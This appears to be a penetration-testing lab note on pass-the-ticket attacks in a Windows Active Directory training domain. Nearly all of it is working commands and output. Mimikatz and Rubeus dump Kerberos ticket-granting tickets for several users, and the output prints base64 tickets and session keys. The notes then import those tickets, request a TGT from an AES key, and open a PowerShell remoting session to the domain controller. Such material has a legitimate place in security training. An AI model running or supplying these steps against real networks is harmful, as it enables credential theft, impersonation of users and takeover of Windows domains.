# Pass-the-Ticket from Windows

## Exporting Kerberos Tickets

### Mimikatz Kirbi Files

```pwsh
PS C:\Users\Administrator\Desktop> C:\Tools\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
```

```output title="Output" hl_lines="27 55 83"
Authentication Id : 0 ; 374300 (00000000:0005b61c)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/11/2024 11:40:33 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107

         * Username : david
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 12/11/2024 11:40:33 AM ; 12/11/2024 9:40:33 PM ; 12/18/2024 11:40:33 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT ; @ INLANEFREIGHT.HTB
           Client Name  (01) : david ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             491bfffde65d8d84b2e3ac34b1043e6795e083f25b864aecd9af965e730b0a9a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;5b61c]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi !

Authentication Id : 0 ; 367399 (00000000:00059b27)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/11/2024 11:40:33 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106

         * Username : julio
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 12/11/2024 11:40:33 AM ; 12/11/2024 9:40:33 PM ; 12/18/2024 11:40:33 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT ; @ INLANEFREIGHT.HTB
           Client Name  (01) : julio ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             79168af8ae09731715e08c612aafe8c1f12e9ddbaa68199968cf9e444cd157ff
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;59b27]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi !

Authentication Id : 0 ; 371965 (00000000:0005acfd)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/11/2024 11:40:33 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108

         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 12/11/2024 11:40:33 AM ; 12/11/2024 9:40:33 PM ; 12/18/2024 11:40:33 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (02) : krbtgt ; INLANEFREIGHT ; @ INLANEFREIGHT.HTB
           Client Name  (01) : john ; @ INLANEFREIGHT.HTB ( INLANEFREIGHT )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c2dd7d3ab19a5ba17b97aa4c49a13ae8da95a3df46380a6f899f57536f4c1606
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;5acfd]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi !
```

### Rubeus Dump

```pwsh
PS C:\Users\Administrator\Desktop> C:\Tools\Rubeus.exe dump /nowrap
```

```output title="Output" hl_lines="29 55 81"
Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID    : 0x628b5

  UserName                 : david
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x5b61c
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1107
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 12/11/2024 11:40:33 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : david@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  david
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  12/11/2024 11:40:33 AM
    EndTime                  :  12/11/2024 9:40:33 PM
    RenewTill                :  12/18/2024 11:40:33 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  SRv//eZdjYSy46w0sQQ+Z5Xgg/Jbhkrs2a+WXnMLCpo=
    Base64EncodedTicket   :

      doIFsjCCBa6gAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFkwggRVoAMCARKhAwIBAqKCBEcEggRDoLr6CRsyjtk97w+Vda4GdE4rVJUl3wfSqXZ+PEI5XjugUUZeH7ti9xW/90X5KSPGyRmPh6y4YC6yQYLR64AO9XaFaC07lAShCLZF1kU1ec+lu4l2iywup7u5J7gnNOBSHfadtpvGMgGcU/w1ZGc7g+09W1T5Bv8jTzg7jcU7nYvIRbBwOtI+34F0D4kyo3a7lPB8gl774RVoQapMICl8m42qAsG83BpzjQmbaZDeGnrpy4Ze6+7eOzbv9Z0+jE6cOiYzoGAzOBF1oXbnMk6irW6Lhf5QOFsGc2rsL7Mm+ISMl2n/ze6gWOGOVJNddtGQLjRbiWnnN2LRNlEuCAOfpfaSt5ZvK+5gWFrkblnO4jDX0TWfHBiBpNTxy5OcJBmZ+0fPxaMGlpH0Nmo7Mcjs1zHwdrGH/LAsXz3lEfrxW+96fBwVagTxwisOey4tz39oVECqZIlePRFa5P/xtQ8fir/alqod9ZyKJ6pO8V1+1+B49LtwTiFsQjDtff+JLIECIHPXorwQDoiMlTi2Nk0+Q2yzRt2S4iCxWCB4LpigljPWqySLa3jXnKn+Vb6R8HcBWkDV5mfycGldrVwe+LOeiZcRtPR81Huwmk4GpGrD/4St1vRWiygGfXmyZEiuU44V48TxPcCaeN2kN2dobXXpBOh3hFBVNJfEKTVcM5AQ967IwhfuQw3grISqrROGmgb06CNWc8jB/VXAnjBWOE6THgf7HQMdsPZPwYWLy61gN/pRUvrHKHF/+SQbyiWHCs4bicBARMRU8yr3AtHvh2+HEJjw5GMjDoIVTuzl7oEqCsQz62ymrV7JG+l07bukh3hiHncp2xkEXbUN2PbpvTc8DrbaPrO22e9onhZAVWttX4d+NRVcD+yPtA4nZ/N27AIALEpru9cxmzdg0h/x46rD8xEVz6z/ofwqx08LgxG/1+H4ICnjqj95FS/PlA2CcTdbW6bguif9DoyhR8ehswoY7PuMRgl4bAPs6u9NQDy3hp6oGxB+f6Dd5J5asnx3unhGghTRuFD3wPgW/rszP65GK+iQAzrStRrb3PVJyiVqigKDN87TAZ0wF2kveGPc7JaYr50HZThX0a0UvNjYP2/+Evc0NN2KQRIjn5V5RkBL1GpzUE5/cwi5gJ954FxftfX3CnshaOIB8Q4iNSveTYUXdsid24ix2NXx7uoXeMiLQAj9x6QL7OFQcbjjnhw+3Yq0KnNmkOW618LbbBWVXYfZFlO8Fmy4buOZAW6+6YohQQ7zCqO/4DhNuBc+zntulyoTjjw5X4Ibyq6Jgm2X7Z5qhpR/JaQTWtyg1PwdRu+Ll1kLSbpeFcVlsZQcdpl/T1LgJf2RdcSzL3ulco9HjWtLgNxT4dRPj+r+4yw7yHbrllLK7bO35Mglck0YdFzKTJ3PilaoiF5j5p2a5oYSPZs0UBEBCvRcjGWHTISGtEqcafMzz0qjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCBJG//95l2NhLLjrDSxBD5nleCD8luGSuzZr5ZecwsKmqETGxFJTkxBTkVGUkVJR0hULkhUQqISMBCgAwIBAaEJMAcbBWRhdmlkowcDBQBA4QAApREYDzIwMjQxMjExMTc0MDMzWqYRGA8yMDI0MTIxMjAzNDAzM1qnERgPMjAyNDEyMTgxNzQwMzNaqBMbEUlOTEFORUZSRUlHSFQuSFRCqSYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQg==

  UserName                 : julio
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x59b27
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1106
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 12/11/2024 11:40:33 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : julio@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  julio
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  12/11/2024 11:40:33 AM
    EndTime                  :  12/11/2024 9:40:33 PM
    RenewTill                :  12/18/2024 11:40:33 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  eRaK+K4JcxcV4IxhKq/owfEunduqaBmZaM+eREzRV/8=
    Base64EncodedTicket   :

      doIFujCCBbagAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBGEwggRdoAMCARKhAwIBAqKCBE8EggRLtlfyBcURGJrCFQJaw3+UKPXmx7WV4Vl+frXpVh3IA54SIxIradK/jIG/j4T2Oq6KBvmB76W34cZIbA0gCtwn1doACLTt6YlplgxIM+lMPBip4e7qJiCt2mEbNR4wq+2Ytv7/Cy3Pn96MxG4mWEjSNgBH5vfmUgMMLBLGcEq53iiGDPEyYa96ZHYkEMKUYR+Eo22s7tGPuLUMIJHW+us1RtuW7mOnxh0g0IzMC0htsY8397WhYix0v6pN0DmcjN7h6YOwR173nwcsycq+HWM1VBBlIU7sTODoPXh/yOAuWbf6TF1SMp5KfWzKnAjQQYA+GVNJAdxIoDFoCoYeqhDO5Nh+CaB2CkCLsI4TFQc4SrRndeJ4hm/49hXLBw+LIsxOQVucVfAghgFwyXdUeW1bC8sPbZ+VbezCyUUn15WOOoRsSha7qYMupj8zua/7vEmgImANamMhQACVe2/qnyuB+WgdJpNgN2i1UFinQ0uzoWSaTz+vmpZ/fwDsex8sxzxYnDGJgizQf1JEQ7bWGGrf034ykeUAA02XvzlJv2Mxu2uNeiC8JhvrU99M6aH6zBszrKgBS5hC+swS8G39QRacQyF/raZhbB0hPMHt7EXnTdjhKIqAhdJ/tQrxdaEEHj3plbDd0u68N1/dxRFC5P74SlQF5iJsNXWmB6LKg7hFz1ZmIwvjEKzCopexLjaJoGJtJt/q1fh26hhRCl3TH3Q9taOw5gR8B4oMj3G+s/aQ+rU/wP21kUXVewcXwgetOthCeTdyuSln5Cd8mO9qHFrSQJXQ8Iiy6HhAXOWvcJM3EmDp8ZB309i4iLy1fIFYzY23HVAfHxfqS83hBR0KDrxwvC42f0Ql3nO4xMohRACdyQT3gI6paVvRwpmBWzseQB6LfH4wY184PwGzjO5WrocBgfmUdJFFfuMHFHRqrrAR5ysUyro479gggje8BG7VbzM1ghzB2Wixz72JWVpVmC1jgHiP1kANr/MiSHI8Uomm2K/HuUR99NrTJab+wphKR2QPSgYKC3H4TDzwQHL3sY7gGiIVHcguzSKVPu0A4KGX5eYKPlm8duKSKlGOxwF8UlmVUT6yfOLH7Oa/73ZdCgqp+Ogqd4oIIOfTuhofmeqhT8D/Gx6RNQc1rHl0y+AVF5ZmuAb/Ouz4jP8hrefXq2FftLS82PQ053nbehIYFtL4hlY6VuPVctfc0Coo/G+U8B85V0f4mWFaZGuvsreK/hQTCkiVrgd3mags/r8+eopay8kk0mwpmytvq+4CDKkHJdDl+Q4dL2xrRQdySyKRKQy9Ui350yT/6prtoKouqN39wFY5Ut5EAnEC0GpUzF9u1sOP2UkFGyT0fEw8TwEU+9Obr55FpTI9Rh6UOMbjI5iEIVGiTxFakKMwa8NlOMKj5/B5UmYUxy+Dsj1Hsoxyo5RsVKC0/uE+9eb89b/odfWh/l3vlc4Jpr7FYYyvfqOB8jCB76ADAgEAooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHkWiviuCXMXFeCMYSqv6MHxLp3bqmgZmWjPnkRM0Vf/oRMbEUlOTEFORUZSRUlHSFQuSFRCohIwEKADAgEBoQkwBxsFanVsaW+jBwMFAEDhAAClERgPMjAyNDEyMTExNzQwMzNaphEYDzIwMjQxMjEyMDM0MDMzWqcRGA8yMDI0MTIxODE3NDAzM1qoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

  UserName                 : john
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x5acfd
  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1108
  AuthenticationPackage    : Kerberos
  LogonType                : Service
  LogonTime                : 12/11/2024 11:40:33 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.HTB
  UserPrincipalName        : john@inlanefreight.htb


    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
    ServiceRealm             :  INLANEFREIGHT.HTB
    UserName                 :  john
    UserRealm                :  INLANEFREIGHT.HTB
    StartTime                :  12/11/2024 11:40:33 AM
    EndTime                  :  12/11/2024 9:40:33 PM
    RenewTill                :  12/18/2024 11:40:33 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  wt19OrGaW6F7l6pMSaE66NqVo99GOApviZ9XU29MFgY=
    Base64EncodedTicket   :

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6OLctYAaESgw+oTdR8DA/DUSoiYNigB1dAbBmuiQR91wSAxdxIyFQYrx4cAloXaLHR5QjV+oAecvAqgL6ztIbPXoa4xTAHSq7PH7v8hzEqkkAF46Y84jkQoHSotHL7XJ7vD/HfocgBxLCewNxGzsyJ7KGq7/m690nL6f56HvB3gxmviqZpd4OwKHBONkhmiIltw7oUEVJ97PymQx3DhodF1BQub7Eevz+XHYydhJoX628GGzuPVEMEGNqJhGwIvmsZIL5bnJgfPSfnu3mBPh30eOQ1VmJk1QixsWk/DCJc8Jr9BYp9HymW2i5OwgWbYSJyC86UfggNBpqK8t1uLSXQD/y9vFQHMXiSLwdP/0libycw6tAMEe8IktV+LEufVL4ieqhjQmW+zHjCrudKlR6ORQheUYO9l2USTe4KyzDdC71lFY4jomojClwYWt0ltn9U2tdfzwuFnGzI0l0jJoUE3IUvWE/Fm0l2n4rCHe1RRqcTErIeU4Qh10SvNulA2hyyb7SQohNbd/FAZWwUcJfod9oRWe8GAB1NK9GJeDofa3KxiiLHsYyg1o0xxLWVXkwk9j7o96oWH2wdDy0u+CJlfoPe7StKgdXrSj6yTLhu+ADS55RyVxAHDf7JVeeCaiF5bDix1sKNO2uq8hhh2TOS0Ox/oIyu5jKCty1Tu49GvSkhO7rU+VfsI/pqbYD7NZaqF24/HvkosJHuA/cyoBKWTMfiMMT6nC+Cs9snPe+6UiW6glRwR7gQsBwif/n0ALxzEDbtSrJpGSbUvMGvSeEu+Z9C3WoN97s2koiTZor7R87q/jqc1eO8/R6YISwJY0jwbJDAjn/TCg82E/9tEInHR3dJH8I3eJZAWao2OF/QqGt6SjEGALXnYBPED0OIyFqeF7/yBoSO0FKHVklNfsI3VpNGkxijuFTmVLFH83lRtdQojoUb03EhgMaluR42pcOT2WSo/6ekWJf0/H4adXFNISThKZeBVnm9dNFTG2RfbQy6P0aSC9J4U2SaMYGre9rtd6/aCKRBE49h7/vt6zapiNKg7+C+dVhpWSeSwCtKjBE9sKhMtnlqr4fWdLOh6oJIZ4oBMBDktn4/+xeJTtrYgd668fsj2mIMv8kGemvLXnFwuBSMGLzxTo2eQP9jgoWoSEgQ0pO4gNzCwK9fLd9DzjUSOsXf74ZK51Rku6f5G0RRIRrLVRzDzo+WtPmPqd6VYs7vrwPKzyF+OYpPRmYG7LjqwlpZ8iBh89C91Ke5op2DrLw1+S7m9j+qAqAl8JQnGpt0WnkXqL+/FTPLrnBA/xeTf14WDe6y+MvW1MN2kxF4w+EuB7M80rjr8O6GWhB1ZNN4k+b9M0BaCLgIi8BieUN8R3W4hbHYxkXdNgLasmq+h2ms+TnxmZReyIveGBMrij76Mx/Bf1kqbHGtnmsYCYoKa7rQGnj1RujgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCDC3X06sZpboXuXqkxJoTro2pWj30Y4Cm+Jn1dTb0wWBqETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNDEyMTExNzQwMzNaphEYDzIwMjQxMjEyMDM0MDMzWqcRGA8yMDI0MTIxODE3NDAzM1qoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
```

## Performing the Attack

### Using Mimikatz

```pwsh
PS C:\Users\Administrator\Desktop> C:\Tools\mimikatz.exe privilege::debug 'kerberos::ptt "[0;5acfd]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"' exit
```

### Using Rubeus

#### Kirbi

```pwsh
PS C:\Users\Administrator\Desktop> C:\Tools\Rubeus.exe ptt /ticket:"[0;5acfd]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

#### Encoded Kirbi

```pwsh
PS C:\Users\Administrator\Desktop> $ticket = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Administrator\Desktop\[0;5acfd]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"))
PS C:\Users\Administrator\Desktop> C:\Tools\Rubeus.exe ptt /ticket:$ticket
```

## PowerShell Remoting

### [Logon Type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)

```pwsh
PS C:\Users\Administrator\Desktop> C:\Tools\Rubeus.exe createnetonly /show /program:"powershell.exe"
```

```output title="Output" hl_lines="10"
[*] Action: Create Process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : HMWK9CHR
[*] Domain          : K9JBZNI9
[*] Password        : 7A37ZAAC
[+] Process         : 'powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5500
[+] LUID            : 0x11609d
```

### PtT

```pwsh
PS C:\Users\Administrator\Desktop> C:\Tools\Rubeus.exe asktgt /ptt /user:john /domain:INLANEFREIGHT.HTB /aes256:9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
```

```output title="Output" hl_lines="4"
[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.HTB\john'
[*] Using domain controller: 172.16.1.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      RUZSRUlHSFQuSFRC
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.HTB
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  1/30/2025 9:43:58 AM
  EndTime                  :  1/30/2025 7:43:58 PM
  RenewTill                :  2/6/2025 9:43:58 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  DsA5ZyhbzHHsciTxcn/sNphvfUEE56NJuH1mKf7D0f0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
```

### Using the Ticket

```pwsh
PS C:\Users\Administrator\Desktop> Enter-PSSession -ComputerName DC01
```
